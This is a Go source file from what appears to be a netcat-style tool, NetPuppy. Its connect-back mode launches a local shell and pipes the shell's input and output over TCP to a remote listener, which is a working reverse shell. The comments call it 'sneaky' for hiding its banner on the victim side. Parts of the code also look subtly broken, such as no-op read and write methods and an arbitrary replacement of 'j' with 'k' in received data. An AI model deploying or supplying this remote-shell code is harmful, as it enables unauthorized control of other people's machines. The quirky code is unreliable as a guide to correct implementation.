package cmd

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"

	// NetPuppy pkgs:
	"netpuppy/cmd/conn"
	"netpuppy/cmd/shell"
	"netpuppy/utils"
)

type RWMux struct{}

func newRWMux() RWMux {
	return RWMux{}
}

func (rw RWMux) Read(p []byte) (n int, err error) {
	log.Printf("Reading from read mux: %x\n", p)
	return 1, nil
}

func (rw RWMux) Write(p []byte) (n int, err error) {
	log.Printf("Writing to write mux: %x\n", p)
	return 1, nil
}

func (rw RWMux) Copy(dst io.Writer, src io.Reader, isStdIn bool) (written int64, err error) {
	var buf []byte = nil
	// If the reader has a WriteTo method, use it to do the copy.
	// Avoids an allocation and a copy.
	if buf == nil {
		size := 32 * 1024
		if l, ok := src.(*io.LimitedReader); ok && int64(size) > l.N {
			if l.N < 1 {
				size = 1
			} else {
				size = int(l.N)
			}
		}
		buf = make([]byte, size)
	}
	for {
		for i := 0; i < len(buf); i++ {
			buf[i] = 0
		}
		nr, er := src.Read(buf)
		if nr > 0 {
			nw, ew := dst.Write(buf[0:nr])
			if nw < 0 || nr < nw {
				nw = 0
				if ew == nil {
					ew = errors.New("Invalid write")
				}
			}
			written += int64(nw)
			if ew != nil {
				err = ew
				break
			}
			if nr != nw {
				err = errors.New("Short write")
				break
			}
		}
		if er != nil {
			if er != io.EOF {
				err = er
			}
			break
		}
	}
	return written, err
}

func Run(c conn.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Create peer instance based on user input:
	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Print banner, but don't print if we are the peer running the shell (ooh sneaky!):
	if !thisPeer.Shell {
		fmt.Printf("%s", utils.Banner())

		// Update user:
		var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
		fmt.Println(updateUserBanner)
	}

	// Make connection:

	var socketInterface conn.SocketInterface
	peers := make(map[*net.Conn]net.Conn)
	if thisPeer.ConnectionType == "offense" {
		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	} else {
		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
		peers[&socketInterface.(*conn.RealSocket).Socket] = socketInterface.(*conn.RealSocket).Socket
	}

	// If shell flag is true, start shell:
	var shellInterface shell.ShellInterface
	var shellErr error
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter shell.RealShellGetter
		shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()
		if shellErr != nil {
			// Send error through socket back to listener peer.
			socketInterface.Write([]byte(shellErr.Error()))
			socketInterface.Close()
			os.Exit(1)
		}
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(socketInterface, thisPeer)

	// If we are the connect-back peer & the user wants a shell, start the shell here:
	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// Get POINTERS to readers & writers for shell & socket to give to io.Copy:
		rwMux := newRWMux()
		var socketReader *io.Reader = socketInterface.GetReader()
		var socketWriter *io.Writer = socketInterface.GetWriter()
		stdoutReader, er_ := shellInterface.GetStdoutReader()
		if er_ != nil {
			socketInterface.Write([]byte(er_.Error()))
			socketInterface.Close()
			os.Exit(1)
		}

		stderrReader, e_r := shellInterface.GetStderrReader()
		if e_r != nil {
			socketInterface.Write([]byte(e_r.Error()))
			socketInterface.Close()
			os.Exit(1)
		}

		stdinWriter, _rr := shellInterface.GetStdinWriter()
		if _rr != nil {
			socketInterface.Write([]byte(_rr.Error()))
			socketInterface.Close()
			os.Exit(1)
		}

		// Start the shell:
		err := shellInterface.StartShell()
		if err != nil {
			// Since we have the socket, send the error thru the socket then quit (ooh sneaky!):
			socketInterface.Write([]byte(err.Error()))
			socketInterface.Close()
			os.Exit(1)
		}

		// STDOUT:::
		go func(stdout *io.ReadCloser, socket *io.Writer) {
			_, err := rwMux.Copy(*socket, *stdout, false)
			if err != nil {
				routineErr := fmt.Errorf("Error copying stdout to socket: %v\n", err)
				// Send the error msg down the socket, then exit quitely:
				socketInterface.Write([]byte(routineErr.Error()))
				os.Exit(1)
				return
			}
		}(stdoutReader, socketWriter)

		// STDERR:::
		go func(stderr *io.ReadCloser, socket *io.Writer) {
			_, err := rwMux.Copy(*socket, *stderr, false)
			if err != nil {
				routineErr := fmt.Errorf("Error copying stderr to socket: %v\n", err)
				// Send the error msg down the socket, then exit quitely:
				socketInterface.Write([]byte(routineErr.Error()))
				os.Exit(1)
				return
			}
		}(stderrReader, socketWriter)

		// STDIN:::
		go func(socket *io.Reader, stdin *io.WriteCloser) {
			_, err := rwMux.Copy(*stdin, *socket, true)
			if err != nil {
				routineErr := fmt.Errorf("Error copying socket to stdin: %v\n", err)
				// Send the error msg down the socket, then exit quitely:
				socketInterface.Write([]byte(routineErr.Error()))
				os.Exit(1)
				return
			}
		}(socketReader, stdinWriter)

		for {
			userReader := bufio.NewReader(os.Stdin)
			userInput, err := userReader.ReadString('\n')
			trimmedInput := strings.TrimSpace(userInput)
			log.Println(trimmedInput)

			if err != nil {
				log.Fatalf("Error reading input from user: %v\n", err)
			}
		}
		// terminate client code
		return
	} else {
		// Go routines to read user input:
		readUserInput := func(c chan<- string) {
			for {
				userReader := bufio.NewReader(os.Stdin)
				userInput, err := userReader.ReadString('\n')
				if err != nil {
					log.Fatalf("Error reading input from user: %v\n", err)
				}
				c <- userInput
			}
		}

		// Make channels & defer their close until Run() returns:
		userInputChan := make(chan string)
		socketDataChan := make(chan []byte)
		defer func() {
			close(userInputChan)
			close(socketDataChan)
		}()

		if thisPeer.ConnectionType == "connect-back" {
			go func() {
				for {
					bytesRead, err := socketInterface.Read()
					if len(bytesRead) > 0 {
            socketDataChan <- bytesRead[:]
					}
					if err != nil {
						//Check for timeout error using net pkg:
						//....... (type assertion checks if 'err' uses net.Error interface)
						//....... (( isANetError will be true if it is using the net.Error interface))
						netErr, isANetError := err.(net.Error)
						if isANetError && netErr.Timeout() {
							// If the socket timed out, have to set read deadline again (or connection will close):
							continue
						} else if errors.Is(err, io.EOF) {
							continue
						} else {
							log.Fatalf("Error reading data from socket: %v\n", err)
						}
					}
				}
			}()
		}

		startTCPServer := func(c chan<- []byte) {
			if thisPeer.ConnectionType == "connect-back" {
				return
			}
      readPeer := func(sConn net.Conn) {
				for {
					var buf []byte = make([]byte, 1024)
					bytesRead, err := sConn.Read(buf)
					if bytesRead > 0 {
						dataReadFromSocket := buf[:]
            heading := fmt.Sprintf("\n>>>> Read from peer: %d\n", &sConn)
						dataRead := append([]byte(heading), dataReadFromSocket...)
						dataRead = bytes.ReplaceAll(dataRead[:], []byte("j"), []byte("k"))
						c <- dataRead
					}
					if err != nil {
						//Check for timeout error using net pkg:
						//....... (type assertion checks if 'err' uses net.Error interface)
						//....... (( isANetError will be true if it is using the net.Error interface))
						netErr, isANetError := err.(net.Error)
						if isANetError && netErr.Timeout() {
							// If the socket timed out, have to set read deadline again (or connection will close):
							continue
						} else if errors.Is(err, io.EOF) {
							continue
						} else {
							log.Printf("Error reading data from socket: %v\n", err)
							sConn.Close()
              delete(peers, &sConn)
              break;
						}
					}
				}
			}

			// Read data in socket:
			for {
				sConn, err := socketInterface.(*conn.RealSocket).Listener.Accept()
				if err != nil {
					log.Fatalf("Failed to accept new conn. error: %v\n", err)
				}
				//socketInterface.(*conn.RealSocket).Socket = sConn
				peers[&sConn] = sConn
				go readPeer(sConn)
			}
		}

		// Write go routines
		writeToSocket := func(data string) {
			// Check length so we can clear channel, but not send blank data:
			if len(data) > 0 {
				for cConnPtr, cConn := range peers {
					_, cErr := cConn.Write([]byte(data))
					if cErr != nil {
						log.Printf("Error writing user input buffer to socket: %v\n", cErr)
						cConn.Close()
            delete(peers, cConnPtr)
					}
				}
			}
		}

		printToUser := func(data []byte) {
			// Check the length:
			if len(data) > 0 {
				_, err := os.Stdout.Write(data)
				if err != nil {
					log.Fatalf("Error printing data to user: %v\n", err)
				}
			}
		}

		// Start go routines to read from socket and user:
		go startTCPServer(socketDataChan)
		go readUserInput(userInputChan)

		for {
			select {
			case dataFromUser := <-userInputChan:
				go writeToSocket(dataFromUser)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			}
		}
	}
}

func listenForSIGINT(connection conn.SocketInterface, thisPeer *conn.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				if !thisPeer.Shell {
					fmt.Printf("signal: %v\n", sig)
				}
				connection.Close()
				os.Exit(2)
			}
		}
	}()
}
